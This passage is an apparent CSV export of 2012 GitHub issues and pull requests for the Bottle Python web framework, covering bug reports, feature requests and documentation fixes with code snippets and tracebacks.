  File ""c:\python32\lib\cgi.py"", line 656, in read_multi
    raise ValueError('Invalid boundary in multipart form: %r' % (ib,))
ValueError: Invalid boundary in multipart form: b''
"
357,Add Windows information in Installation tutorial,2012-08-01T14:22:35Z,,,,,"The Installation section (http://bottlepy.org/docs/dev/tutorial.html#installation) does not have anything to Windows and does not even explicit it is *nix only. I guess it is an important improvement to newcomers.
"
356,template from .tpl file caused IndexError: pop from empty list,2012-07-31T11:47:09Z,2015-12-04T09:53:13Z,,IndexError,IndexError: pop from empty list,"Bottle v0.11.dev on Python 3.2

By following the examples in the tutorial section http://bottlepy.org/docs/dev/tutorial.html#templates, instead of showing the expected results, the following error is thrown.

Traceback (most recent call last):
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 787, in _handle
    return route.call(*_args)
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 1575, in wrapper
    rv = callback(_a, *_ka)
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 3132, in wrapper
    return template(tpl_name, *_tplvars)
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 3107, in template
    return TEMPLATES[tplid].render(kwargs)
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 3080, in render
    self.execute(stdout, kwargs)
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 3068, in execute
    eval(self.co, env)
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 184, in __get__
    value = obj.**dict**[self.func.**name**] = self.func(obj)
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 2967, in co
    return compile(self.code, self.filename or '<string>', 'exec')
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 184, in **get**
    value = obj.**dict**[self.func.**name**] = self.func(obj)
  File ""C:\Users\Benny\Desktop\bottle\bottle.py"", line 3023, in code
    cmd = stack.pop()
IndexError: pop from empty list
"
355,html escape error when starts with space,2012-07-29T03:06:00Z,2012-07-30T01:19:14Z,,,,"Html escape works well in this way: {{!my_comments}},
while SimpleTemplate throws error when use in this way: {{ !my_comments }}.

This problem blocked me for quite a while, for both {{my_comments}} and {{ my_comments }} do exactly the same job.

It would be nicer if {{ !my_comments }} works too.
"
354,Updated url of logo,2012-07-26T16:02:19Z,2012-07-26T17:00:53Z,,,,"Hi,
The logo .png has moved but the README still refers to the old path.
"
353,Forms use wrong encoding,2012-07-25T21:02:10Z,2012-09-05T16:05:30Z,,,,"When using letters such as ""ą"", ""ł"" in forms on Chrome, Mac OS X, I get wrongly encoded string back on the server. Respectively ""Ä"" (note there are 2 chars there, 1 invisible), and ""Å"".
"
352,mount() makes the views/ dir fail on mounted apps,2012-07-19T11:22:17Z,2012-07-23T08:00:47Z,,,,"I'm using a distributed approach to admin panel; I'm mounting the admin app to /admin.

The issue comes in the integration;
both applications have been build separately, and works alright when served individually.

Once I mount the admin_app/public_app to the mixed_app, views fails in subapplications, as the TEMPLATE_PATH is ['./', './views/'] and resolves absolutely against mixed_app views/ folder (that does not exist).

Every mounted app should refer to it's own folders, so there's no need for mixing both applications' folders (name collisions!!!).
I'm still unsure if deploy the app mixed or put them separately on http and https

&lt;project_folder&gt;/
-> mixed_app.py
-> admin_app/
---> views/
-----> index.tpl
-> public_app/
---> views/
-----> index.tpl
"
351,tutorial: add missing form action and submit input (closes #335),2012-07-17T13:37:14Z,2012-07-17T15:13:39Z,,,,
350,Parameter order of Bottle.mount() changed in 8b023afd; update tutorial,2012-07-16T10:38:38Z,2012-07-16T11:43:32Z,,,,
349,A couple of minor documentation fixes,2012-07-06T19:33:26Z,2012-07-07T08:48:41Z,,,,"Hi -

I had an entire list of typos to fix in the documentation, but when I git cloned bottle I found that most of them had already been fixed.  So one small language fix in tutorial.rst and the Routing Order example in routing.rst was still using the legacy wildcard syntax; probably better to switch it to the new syntax?

Question: how could I have done this without forking the entire bottle tree on github?  That is, after cloning, editing, and committing I didn't know what to do with the patch file.  (Sorry if this is obvious, we use mercurial, so I'm not that familiar with git.)
"
348,LICENSE.txt renamed to LICENSE in ddb7e5acd,2012-06-27T08:33:54Z,2012-06-27T13:18:09Z,,,,
347,redirect() on HTTPS site redirects to HTTP,2012-06-26T12:54:41Z,2012-06-26T13:28:41Z,,,,"Using `redirect()` with only a path on a HTTPS site redirects to HTTP:

``` python
redirect(""/"") # on https://example.org/some/path
```

should redirect to `https://example.org/` but redirects to `http://example.org/`.

Using full URLs works:

``` python
redirect(""https://example.org/"") # on https://example.org/some/path
```

redirects to `https://example.org/` correctly.
"
346,Fix typo in Plugin Development Guide (stopwatch example),2012-06-26T10:26:57Z,2012-06-26T10:37:52Z,,,,
345,strongly recommend bottle to add decorator:template_filter,2012-06-26T06:45:43Z,,,,,"The code is like this:

<pre>
def template_filter(name=None):
    '''
    like @template_filter('name')
    '''

    def decorator(func):
        BaseTemplate.settings.setdefault('filters', {})

        BaseTemplate.settings['filters'][name or func.__name__] = func

        return func

    return decorator
</pre>

and can use like this:

<pre>
@template_filter()
def name():
    return 'result'

</pre>
"
344,Python 3 class FormsDict utf-8 issue,2012-06-25T13:00:44Z,2012-06-26T10:36:36Z,,,,"In Python 3 the default encoding is utf-8, so str.encoding(""latin1"") causes exception.I think using str.encode(sys.getdefaultencoding()) is a more safe way.
"
343,Undefined variable os.mkdirs(),2012-06-24T08:42:09Z,2012-06-25T13:42:12Z,,,,
342,request.query fails while query string contains chinese word on python3,2012-06-23T14:50:10Z,2012-06-26T10:36:36Z,,,,"When the query string has chinese words,for example http://localhost:8000/editor?file=%E7%BF%BB%E8%AF%91.txt,request.query.file returns an empty string.
"
341,bottle_sqlite plugin issue,2012-06-22T22:50:55Z,2012-06-23T05:11:16Z,,,,"I installed bottle_sqlite thru every means possible, however when I try to do
plugin = bottle.ext.sqlite.Plugin(dbfile='/tmp/test.db')
it throws me an attribute error, saying that module object has no attribute sqlite.
I tried this both in running, web version of bottle and in terminal.
What can be the issue here?
"
340,No module named werkzeug,2012-06-19T19:18:13Z,2012-06-25T22:41:32Z,,AttributeError,AttributeError: 'module' object has no attribute 'werkzeug',"When I follow the procedures to setup werkzeug as a middleware for Bottle:

```
import bottle
app = bottle.Bottle()
werkzeug = bottle.ext.werkzeug.Plugin()
app.install(werkzeug)
```

I get the following import error:

```
Traceback (most recent call last):
File ""ml_site.py"", line 62, in <module>
werkzeug = bottle.ext.werkzeug.Plugin()
AttributeError: 'module' object has no attribute 'werkzeug'
```

Anyone having the same issues?
"
339,unicode form handling is broken with python3,2012-06-19T11:19:47Z,2012-07-04T18:55:35Z,,,,"(tested with bottle 0.10.9)

The following example does work fine with Python 2.7.3 but doesn't work with Python 3.2.3.

**Python 3:**
Just run the example code and enter `test` and `töst` in the form. The first `test` works fine but `töst` will be reduced to an empty string by `request.forms.text`.

**Python 2:**
It works fine with `test` and `töst` entered.

``` python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

import bottle

from bottle import template, route, post, request


@route(""/"")
def index(text=""""):
    return template(""<form method='post' action='/'><input type='text' name='text' \
        value='{{text}}'><br><input type='submit'></form>"", text=text)


@post(""/"")
def post():
    text = request.forms.text

    return index(text)

if __name__ == ""__main__"":
    bottle.debug(True)
    bottle.run(reloader=True)
```
"
338,Add a @maxage decorator for easy static responses,2012-06-18T07:30:18Z,2012-09-09T11:22:28Z,,,,"I wrote this little helper for one of my projects and found it pretty useful, so I decided to see how easy it was to include in bottle proper.
"
337,Add .travis.yml for Travis CI (http://travis-ci.org/),2012-06-17T06:17:26Z,2012-06-18T16:06:34Z,,,,"See passing Travis build at http://travis-ci.org/#!/msabramo/bottle/builds/1638841
"
336,Add py33 to tox.ini,2012-06-17T04:37:22Z,2012-06-17T21:14:01Z,,,,"```
...
  py25-empty: commands succeeded
  py26: commands succeeded
  py27: commands succeeded
  py32: commands succeeded
  py27-most: commands succeeded
  congratulations :)
```
"
335,Tuturial - HTTP Request Methods not working,2012-06-15T13:02:08Z,2012-07-17T15:13:40Z,,,,"the form is missing action, and submit button

currently on page:

``` python
@get('/login') # or @route('/login')
def login_form():
    return '''<form method=""POST"">
                <input name=""name""     type=""text"" />
                <input name=""password"" type=""password"" />
              </form>""""""
```

should become:

``` python
@get('/login')
def login_form():
        return '''
        <form method=""POST"" action=""/login"" >
                <input name=""name"" type=""text"" />
                <input name=""password"" type=""password"" />
                <input type=""submit"" value=""Submit"" />
        </form>'''

```
"
334,Command Line Interface: bottle.ext ImportError,2012-06-13T08:59:57Z,2012-09-19T11:54:29Z,,ImportError,ImportError: No module named ext,"To reproduce the issue:

Install a virtual environment:

``` bash
$ virtualenv --no-site-packages venv
$ venv/bin/pip install bottle bottle-sqlalchemy sqlalchemy
```

Create a demo app, `bottle.ext` is imported but not used to simplify the test case:

``` bash
$ cat > foobar.py << EOF
from bottle import Bottle, run
from bottle.ext import sqlalchemy

app = Bottle()

@app.get('/')
def hello():
    return ""Hello world""

if __name__ == '__main__':
    run(app)

EOF
```

Run the app, it works:

``` bash
$ venv/bin/python foobar.py
Bottle server starting up (using WSGIRefServer())...
Listening on http://127.0.0.1:8080/
Hit Ctrl-C to quit.

^CShutdown...
```

Use the Command Line Interface, `ImportError`:

``` bash
$ venv/bin/bottle.py foobar:app
Shutdown...
Traceback (most recent call last):
  File ""venv/bin/bottle.py"", line 2929, in <module>
    run(args[0], host=host, port=port, server=opt.server, reloader=opt.reload, plugins=opt.plugin)
  File ""venv/bin/bottle.py"", line 2361, in run
    app = load_app(app)
  File """", line 2308, in load_app
    rv = load(target) # Import the target module
  File ""venv/bin/bottle.py"", line 2293, in load
    if module not in sys.modules: __import__(module)
  File ""./foobar.py"", line 2, in <module>
    from bottle.ext import sqlalchemy
ImportError: No module named ext
```

Same issue with the trunk version
"
333,Bottle and Android 4.0.4,2012-06-09T20:47:44Z,,,,,"Requests from Adnroid 4.0 needs along time to be received and sometimes it looks like this:

192.168.178.25 - - [09/Jun/2012 22:10:27] ""GET / HTTP/1.1"" 404 725
192.168.178.25 - - [09/Jun/2012 22:10:37] ""GET /l HTTP/1.1"" 404 727
192.168.178.25 - - [09/Jun/2012 22:10:47] ""GET /la HTTP/1.1"" 404 729
192.168.178.25 - - [09/Jun/2012 22:10:57] ""GET /lam HTTP/1.1"" 404 731
192.168.178.25 - - [09/Jun/2012 22:11:07] ""GET /lamp HTTP/1.1"" 404 733
192.168.178.25 - - [09/Jun/2012 22:11:17] ""GET /lamp/ HTTP/1.1"" 404 735
192.168.178.25 - - [09/Jun/2012 22:11:27] ""GET /lamp/s HTTP/1.1"" 404 737
192.168.178.25 - - [09/Jun/2012 22:11:37] ""GET /lamp/se HTTP/1.1"" 404 739

Especially I've doing only HttpUrlConnections.
"
332,StripPathMiddleware recipe is not SEO friendly,2012-06-08T14:40:46Z,,,,,"It should do a permanent redirect to URL without trailing slash instead of internally remove slash. I did a gist [1] about it to answer a thread in bottlepy maillist.

[1] https://gist.github.com/2895930
"
331,Use only a plugin argument in view function,2012-06-07T14:29:57Z,2013-12-27T03:14:56Z,,,,"As we known, some bottle plugins such as `bottle.ext.sqlite` need to provide a request scoped object to the view function. If a application has a large number of the installed plugins, the arguments of view function will become too long.

For example:

``` python
@app.get(""/article/:id"")
def article(db, current_user, cache, taskmanager, id):
    cursor = db.execute(""SELECT * FROM article WHERE id = ?"", id)
    article = Article.from_cursor(cursor.fetchone() or bottle.abort(404))
    if article.need_destory_cache(current_user):
        taskmanager.put(lambda: cache.destory(""article-%d"" % id))
    return bottle.template(""article.html"", article=article)
```

I thought that it's possible to make view functions be more concise, if we put all request scoped object into one argument. Just like this:

``` python
@app.get(""/article/:id"")
def article(context, id):
    cursor = context.db.execute(""SELECT * FROM article WHERE id = ?"", id)
    article = Article.from_cursor(cursor.fetchone() or bottle.abort(404))
    if article.need_destory_cache(context.current_user):
        task = lambda: context.cache.destory(""article-%d"" % id)
        context.taskmanager.put(task)
    return bottle.template(""article.html"", article=article)
```

If a view argument has not argument named ""context"", the context object will not be created.
"
330,get_url 's return is invalid,2012-06-07T12:41:17Z,,,,,"It happends when i use get_url between apps.
for example, the codes is:

<pre>
import bottle

app = bottle.app.push()
child_app = bottle.app.push()

app.mount('/child', child_app)

@app.route('/', name='index')
def index():
    return 'Hello world!'

@child_app.route('/')
def child_index():
    return app.get_url('index')

if __name__ == '__main__':
    bottle.debug(True)
    bottle.run(app, host='0.0.0.0', reloader=True, interval=0)

</pre>

when I visit http://127.0.0.1/child, It shows /child/, but it should be /, right?
"
329,POST arrays support,2012-06-07T04:51:07Z,2012-06-10T02:59:32Z,,,,"According to cgi module documentation FieldStorage item is list when POST contains multiple values with same parameter name. This change makes BaseRequest consume such parameters correctly and remove ""[]"" suffix from parameter name if present.
"
328,header parameters cache issue,2012-06-04T10:26:31Z,2012-06-04T10:47:06Z,,,,"i  have developed service in bottle and it is cashing the request header parameters, whatever i send in the first call it keeps the header cashed unless i restart the server.
"
327,Update docs/routing.rst,2012-05-31T07:49:57Z,2012-05-31T08:08:22Z,,,,"Add explicit routing configuration examples
"
326,Request: refresh header realisation,2012-05-22T03:11:21Z,,,,,"Subj!
Here's a 10 sec redirect

HTTP/1.1 200 ok
Refresh: 10; url=http://www.example.com/
Content-type: text/html
Content-length: 78

Please follow <a href=""http://www.example.com/"">this link</a>!
"
325,How to use the Bottle.mount()?,2012-05-21T09:01:21Z,2012-05-22T03:14:15Z,,,,"Sorry I cannot find a proper location to ask this question, so I submit a new issue.
Well, I need implement two URL, say ""http://localhost/product/1.0/module1"" and ""http://localhost/product/1.0/module2"", so I create three files:
1. module1.py
    from bottle import get, default_app
    default_app.push()
    @get('/module1')
    def list_module1():
        return 'module1'
    app = default_app.pop()
1. module2.py
   from bottle import get, default_app
   default_app.push()
   @get('/module2')
   def list_def():
       return 'module2'
   app = default_app.pop()
2. product.py
   import bottle
   BASE_URL='/product/1.0'
   root_app = bottle.default_app()
   import module1
   root_app.mount(BASE_URL, module1.app)
   import module2
   root_app.mount(BASE_URL, module2.app)

Only http://localhost/product/1.0/module2 can work.  As you know, the module1 and module2 may be very complex, so we have to separate them as two files, and they have same prefix, so a common file should join them as a whole application. In future, we may add module3, module4, etc.
The usage of Bottle.mount() is confusing for me, and the section ""Default Application"" in doc is ambiguous for my issue.
Could anyone help to give some suggestions? thanks very much!
"
324,Typo Fix,2012-05-14T18:53:06Z,2012-05-14T19:20:51Z,,,,"My apologies for the earlier b0rked pull-request.  
"
323,test data ? needs updating in 0.10.9.,2012-05-13T10:58:34Z,,,,,"1) ZeroDivisionError is absent from the file tested read and tested in test/test_outputfilter.py
2) ''' The virtual module needs a valid **file** attribute.
   If not, the Google app engine development server crashes on windows.'''
 A Windows issue it seems in test/test_importhook.py
These two tests possibly need a fix.  There was one other but that is a gentoo sandbox issue that isn't an error.

```
    sed -e 's:ZeroDivisionError:Internal Server Error:g' -i test/test_outputfilter.py || return
    sed -e ""s/        self.assertTrue/#        self.assertTrue/"" -i test/test_importhook.py || return
```

in the ebuild sees these succeed.
"
322,SimpleTALTemplate::render StringIO issue,2012-05-11T00:33:49Z,,Needs input,,,"In SimpleTALTemplate in the render method around line 2877 the output variable is initialized with StringIO but StringIO is not imported as StringIO but as BytesIO (see around line 93)

possible solution around line 93, for python 2.x branch:
from StringIO import StringIO as BytesIO, StringIO

also for better performance cStringIO can be used
try
    from cStringIO import StringIO as BytesIO, StringIO
except ImportError:
    from StringIO import StringIO as BytesIO, StringIO
"
321,Fix exception when pickling FormsDict,2012-05-10T14:08:25Z,2012-05-14T13:16:37Z,,,,"Hello,

Currently, Python generates a very cryptic TypeError if you try to pickle a FormsDict object, because of the way `__getattr__` is implemented.  This is a 3-line bugfix for that problem.  It would be wonderful if you could incorporate this into the official version!

Thanks,
Ian
"
320,Fixed typo save -> safe,2012-05-09T22:36:19Z,2012-05-14T18:48:16Z,,,,"Subject says it all.
"
319,Fix a typo in test/test_server.py,2012-05-02T14:34:17Z,2012-05-02T14:37:02Z,,,,
318,@view decorator doesn't work well with SQLitePlugin,2012-04-28T04:08:36Z,2012-05-26T03:30:33Z,,,,"Bottle is the most simple and best web framework I've used, brilliant work!

I'm now using view decorator together with SQLitePlugin, and the code is like under:

from bottle import view
from bottle.ext import SQLitePlugin

bottle.install(SQLitePlugin)
.....
@get('/<name>')
@view('testpage')
def testget(name, db):
    ......

And now an 'no argument is given' error is reported. And I check the source code to know that SQLitePlugin use  callback 'argspec' to inject the 'db' parameter. And as the view decorator use _args, *_kvargs,  no parameter is injected. 

So I make a hack code, in each decorator, use:

wrapper.argspec = callback.argspec if hasattr(callback, 'argspec') else inspect.getargspec(callback)

and in each plugin, use:

argspec = callback.argspec if hasattr(callback, 'argspec') else inspect.getargspec(callback)

instead of :

argspec = inspect.getargspect(_callback)

It works, but ugly for both plugin developer and decorator developer. Is there any standard way to do this ?
"
317,Assertion error with gevent app mounted,2012-04-26T22:47:43Z,,,AssertionError,AssertionError: Cannot shift. Nothing left from SCRIPT_NAME,"I'm seeing the exception below as soon as I compose my app using bottle.mount() and concurrency goes >1. The first request is handled correctly, but additional requests that come in while the initial request had not finish yet give this error. The initial request is hanging on a socket read from a back-end database.

When avoiding mount(), but running the sub-app stand-alone, I do not observe any problems.

This is using the gevent server on Bottle 0.10.9.

Traceback (most recent call last):
  File ""/home/pieter/workspace/env/local/lib/python2.7/site-packages/gevent/pywsgi.py"", line 438, in handle_one_response
    self.run_application()
  File ""/home/pieter/workspace/env/local/lib/python2.7/site-packages/gevent/pywsgi.py"", line 424, in run_application
    self.result = self.application(self.environ, self.start_response)
  File ""/home/pieter/workspace/env/local/lib/python2.7/site-packages/bottle.py"", line 849, in **call**
    return self.wsgi(environ, start_response)
  File ""/home/pieter/workspace/env/local/lib/python2.7/site-packages/bottle.py"", line 824, in wsgi
    out = self._cast(self._handle(environ), request, response)
  File ""/home/pieter/workspace/env/local/lib/python2.7/site-packages/bottle.py"", line 737, in _handle
    return route.call(**args)
  File ""/home/pieter/workspace/env/local/lib/python2.7/site-packages/bottle.py"", line 585, in mountpoint
    request.path_shift(-path_depth)
  File ""/home/pieter/workspace/env/local/lib/python2.7/site-packages/bottle.py"", line 1092, in path_shift
    self['SCRIPT_NAME'], self['PATH_INFO'] = path_shift(script, self.path, shift)
  File ""/home/pieter/workspace/env/local/lib/python2.7/site-packages/bottle.py"", line 1983, in path_shift
    raise AssertionError(""Cannot shift. Nothing left from %s"" % empty)
AssertionError: Cannot shift. Nothing left from SCRIPT_NAME
"
316,would it be better to change request.forms to request.form?,2012-04-19T18:04:05Z,,,,,"would it be better to change request.forms to request.form?

or maybe i miss sth?
"
315,support file obj in static_file func?,2012-04-19T18:03:18Z,2012-04-24T02:05:44Z,,,,"support file obj in static_file func?

i will be more easy to use ~
"
314,Plugins: More a question than an issue,2012-04-18T09:58:44Z,2012-11-04T09:53:06Z,,,,"According to the docs, we can create decorators as plugins

```
@plugin
@route(...)
def action1():
    ...

@plugin
@route(...)
def action2():
    ...
```

This is the same as:

```
app.install(plugin)

@route(...)
def action1():
    ...

@route(...)
def action2():
    ...
```

But is it possible to create a plugin depending on a dynamic operator?
Something like that:

```
@expecting_data_to_be_a_dict_and_have_the_fields(['id', 'title', 'author'])
@route(...)
def action(data):
    ...

app.install(expecting_data_to_be_a_dict_and_have_the_fields(<variable params>)

@route(...)
def action(data):
    ...
```
"
313,Adding an example using WebTest and Nose,2012-04-17T17:34:45Z,2012-04-18T09:25:54Z,,,,
312,Update docs/recipes.rst,2012-04-17T17:11:10Z,2012-04-17T17:13:34Z,,,,"Unit testing example added
"
311,"HEAD forces ""Content-Length: 0"" header",2012-04-17T02:23:23Z,2012-08-29T23:44:29Z,,,,"The wsgi() function sets 'out =[]' for HEAD requests.  This causes wsgiref WSGIServer to set ""Content-Length: 0"", overriding the Content-Length set by the application.  According to RFC 2616, section 14.13 (http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.13), ""...or, in the case of the HEAD method, the size of the entity-body that would have been sent had the request been a GET.""  The following patch leaves the response body intact, which in turn allows the correct Content-Length to be returned to the HTTP client.  The version I am using is current as of about an hours ago and has a last commit of Fri Apr 6 01:08:24 2012 +0800.

```
861,862c861
<             if response._status_code in (100, 101, 204, 304)\
<             or request.method == 'HEAD':

---
>             if response._status_code in (100, 101, 204, 304):
864a864,865
>             if request.method == 'HEAD':
>                 if hasattr(out, 'close'): out.close()
```
"
310,`route` changes its behavior on some backends,2012-04-10T14:53:09Z,,,,,"Hi,
while tracking a bug I found some voodoo problem on paths prefix.
A route matching `@route(""/:objpath#.+#"")` may lose part of the path:

On ""wsgiref"" I see no bug, but if I switch to `waitress` or `paste` and I try an ""almost valid"" url like `somehost//path/subpath/subsubpath` (note the double ""/"" , which is not exactly correct)  I just receive `subpath/subsubpath` as the full path... so I miss the ""path"" information...

I didn't investigate that long, tell me if you need a minimal test-case.
"
309,Update bottle.py,2012-04-08T15:27:47Z,2012-04-10T11:55:32Z,,,,
308,"(#307) If 'gevent' and quite=True, suppress output",2012-04-05T17:13:06Z,2012-04-05T20:14:31Z,,,,"Issue #307:

When run(server='gevent', host='127.0.0.1', port=9999, quiet=True), bottle still log the request.

like
127.0.0.1 - - [2012-04-06 00:58:02] ""POST / HTTP/1.1"" 201 149 0.000999
"
307,"When use 'gevent' and quite=True, the output should be suppressed",2012-04-05T17:04:12Z,2016-02-08T04:27:42Z,,,,"When `run(server='gevent', host='127.0.0.1', port=9999, quiet=True)`, bottle still log the request.

like
`127.0.0.1 - - [2012-04-06 00:58:02] ""POST / HTTP/1.1"" 201 149 0.000999`
"
306,template export it's namespace to subtemplate,2012-04-02T07:09:31Z,,,,,"sometimes It's convenient for export current namespace when rebase or include.

explicit set the option `bottle.SimpleTemplate.settings['export_env']` to `True` to enable this behavior.

subtemplate can overide the parent's namespace if they both defined same argument.

current this option is global for whole rendering process. The behavior can't change in subtemplate rendering.
"
305,Fixed typos,2012-03-29T19:27:53Z,2012-04-02T15:46:40Z,,,,"Hi.
I fixed some typos across the docs.
Changes are self-explanatory.
"
304,strange bug in version 0.10.dev,2012-03-28T10:22:59Z,,,AttributeError,AttributeError: 'NoneType' object has no attribute 'groupdict',"I can't reproduce it reliably. It happens once in a while, no matter how is the application deployed (paster, built in server etc). When it happens, this exception occurs on every http request (regardless of the url) and requires a restart.

```
127.0.0.1 - - [20/Jan/2012:09:39:55 +0100] ""GET /dev/getcurrentrev HTTP/1.1"" 500 756 ""http://10.13.0.90/dev"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1""
Traceback (most recent call last):
  File ""/GameStream/scripts/bottle.py"", line 687, in _handle
    route, args = self.match(environ)
  File ""/GameStream/scripts/bottle.py"", line 591, in match
    route, args = self.router.match(environ)
  File ""/GameStream/scripts/bottle.py"", line 324, in match
    targets, urlargs = self._match_path(environ)
  File ""/GameStream/scripts/bottle.py"", line 350, in _match_path
   return match, gpat(path).groupdict() if gpat else {}
AttributeError: 'NoneType' object has no attribute 'groupdict'
```
"
303,Improve docs: clarify route ordering topic,2012-03-27T13:17:29Z,,,,,"When [1] appeared in maillist, I read [2] and have doubts about how bottle works, even knowing how it works. The routing order topic give only one example of how bottle do not work, none about how it really works.

I guess we can add some examples about it. Second paragraph already talk about that issue, but examples can improve the docs.

[1] https://groups.google.com/d/topic/bottlepy/9-LkJX6K6xQ/discussion
[2] http://readthedocs.org/docs/bottle/en/latest/routing.html#routing-order
"
302,Enhanced example using @error(404),2012-03-24T21:05:33Z,2012-03-25T18:41:30Z,,,,"Hello!
I added the import line in the `@error(404)` tutorial example.
This way the tutorial it's more complete.

Although I don't know how you're managing the http://bottlepy.org website, if it gets it's contents automatically from these files or not so they stay in sync. 
"
301,Rails like url_for helper,2012-03-15T22:38:37Z,2012-03-16T20:28:50Z,,,,"How about rails like url_for helper?
"
300,Waitress compatibility could be featured,2012-03-13T13:47:51Z,2012-03-13T15:47:54Z,,,,"The waitress WSGI web server ( http://docs.pylonsproject.org/projects/waitress/en/latest/ ) could be included, it's compatible with any python version starting from 2.6... I suppose this is likely to work:

``` python
class WaitressServer(ServerAdapter):
    def run(self, handler):
        from waitress import serve
        serve(handler, host=self.host, port=self.port)
```
"
299,Bottle should have per request local storage,2012-03-09T12:07:51Z,,,,,"Hi,

After some discussion on IRC and Stackoverflow\* regarding reuse of request objects (bottle.request) and thread local (bottle.local) there were identified a need for some sort of per request local storage.

Use case:

In my code I validate login tokens (cookies with session ID or similar) in a generic routing at the beginning of each request before control is handed back to the defined route handling procedure. The token validation is implemented as a decorator called @restricted.

In order to separate the generic code and the route handling I have added an attribute to the request object that holds any user information after token validation so I can use this in the route handling procedures later. To remove redundant database lookups I have also added code to check whether this attribute exists in the request object already.

Problem:

Since request objects are reused, validation will only happen once. Depending on the web server, this might even introduce a security vulnerability.

Using bottle.local would fix the problem for my specific implementation, but any multiplexed IO based server (non-blocking server) might treat the bottle.local storage as ""global"".

Suggested solution:

Adding some sort of request-local storage area that is guaranteed to only be accessible from the current request, no matter web server implementation.

ref: http://stackoverflow.com/questions/9627001/bottle-py-request-object-reuse-object-life-cycle
"
298,access to response.COOKIES  throws exception,2012-03-08T14:20:06Z,2012-03-08T16:14:39Z,,,,"try the following simple code:

> > > import bottle
> > > bottle.response.COOKIES
> > > Traceback (most recent call last):
> > >   File ""<stdin>"", line 1, in <module>
> > >   File ""/usr/local/lib/python2.7/site-packages/bottle.py"", line 1376, in COOKIES
> > >     if not self._cookies:
> > >   File ""/usr/local/lib/python2.7/site-packages/bottle.py"", line 1456, in <lambda>
> > >     lambda self: getattr(_lctx, name),
> > > AttributeError: 'thread._local' object has no attribute 'response_cookies'

looks like the response object was not initialized properly.
"
297,"Error 500 if special non-ascii characters (i.e. ""ä"") are in the path to grademan",2012-03-07T19:16:15Z,2012-03-26T18:15:46Z,,"Exception, UnicodeEncodeError","Exception:, UnicodeEncodeError: 'ascii' codec can't encode character u'\xe4' in position 951: ordinal not in range(128)","Example output:

[..]
Exception:
UnicodeDecodeError(\'ascii\', \'/home/dirk/MeeGo/Daten/Gr\xc3\xa4deMan\', 25, 26, \'ordinal not in range(128)\')
Traceback:
[..]
Traceback (most recent call last):
  File ""/home/dirk/MeeGo/Daten/GrädeMan/bottle.py"", line 663, in wsgi
    out = self._cast(out, request, response)
  File ""/home/dirk/MeeGo/Daten/GrädeMan/bottle.py"", line 618, in _cast
    return self._cast(self.error_handler.get(out.status, repr)(out), request, response)
UnicodeEncodeError: 'ascii' codec can't encode character u'\xe4' in position 951: ordinal not in range(128)
"
296,File never submitted if changedate of file not changed but file actually is changed,2012-03-07T18:43:13Z,2012-03-08T16:23:59Z,,,,"If I rename foo.jpg to bar.jpg and bar.jpg to foo.jpg the changed files are not send again, even after I restart bottle.

Uncommenting the lines
<code>
    if ims:
        ims = ims.split("";"")[0].strip() # IE sends ""<date>; length=146""
        ims = parse_date(ims)
        if ims is not None and ims >= int(stats.st_mtime):
            header['Date'] = time.strftime(""%a, %d %b %Y %H:%M:%S GMT"", time.gmtime())
            return HTTPResponse(status=304, header=header)
</code>
in static_file fixes this.
"
295,Multiple plugins can't inject parameters,2012-03-06T22:20:18Z,,,,,"Hi,

I am trying to write a plugin which injects some data into the the functions, but it failes if I already have another plugin (say sqlite).

A simple example is the code below:

``` python
from bottle import *
import bottle
from bottle.ext import sqlite

app = bottle.Bottle()
test_db = sqlite.Plugin(dbfile='test.db')
cache_db = sqlite.Plugin(dbfile=':memory:', keyword='cache')
app.install(test_db)
app.install(cache_db)

@app.route('/')
def show(db, cache):
    return ""successfully loaded both plugins""

if __name__ == ""__main__"":
    run(app, reloader=True)
```

when run, it throws this error : `TypeError: show() takes exactly 2 arguments (0 given)`
"
294,SimpleTemplate and long i18n strings,2012-03-06T21:12:17Z,2012-03-06T21:18:56Z,,,,"If I have the following in a template:

```
{{_('This is a really long string that '
    'I want to split across multiple lines in the source')}}
```

What I get in the output is the exact same thing, including the {{ and }}.  I may be missing the ""proper"" way to make {{ and }} span multiple lines.  However, if I use the mako_view and do about the same thing:

```
${_('This is a really long string that '
    'I want to split across multiple lines in the source')}
```

It works fine.
"
293,redirect() uses server root instead of application root,2012-03-02T13:32:10Z,,,,,"I've run into an issue when using bottle in a subdirectory of the server root.

Steps to reproduce:
1. Build a simple app in a subdirectory of the server root (CGI works good for that).
2. Put `redirect(""/"")` into a route.
3. Call the route. You'll be redirected to the server root instead of the application root.

This issue makes it difficult to build apps that are deployed in different paths. The cause of the problem is that `redirect()` uses `urljoin()` on the request URL. If the target contains a leading slash, everything after the host part of the URL gets replaced. This could also lead to problems when using `mount()`, though I haven't tested it yet.

Workarounds:
- Build your own redirect function that prepends the application root directory
- Add `request.script_name` to every redirect (ugly)
- modify `redirect()` so that it always includes `request.script_name` (hackish)

The problem with `request.script_name` is that in some cases it includes the name of the .py file which would lead to ugly URLs, especially when using CGI on Apache with mod_rewrite. A more sustainable solution would be the introduction of a application root variable (which can be ""/"" by default). The root path could be set in `run()` or in a special function. When it is set, all redirects are based on that path.

One could also add the path to SimpleTemplate.defaults to include it in template URLs, but a more beautiful solution for that would be a special markup for URLs (maybe `{# #}` or similar).
"
292,Upload Example in Tutorial Doesn't work,2012-03-01T21:42:57Z,,,,,"The [example in the tutorial for uploads](http://bottlepy.org/docs/dev/tutorial.html#post-form-data-and-file-uploads) doesn't work with the current version of bottle.

Here is a modified example that does work:

``` python
from bottle import route, request
@route('/upload', method='POST')
def do_upload():
    data = request.files['data']
    name = data.name
    if name and data.file:
        raw = data.file.read() # This is dangerous for big files
        filename = data.filename
        return ""Hello %s! You uploaded %s (%d bytes)."" % (name, filename, len(raw))
    return ""You missed a field.""
```
"
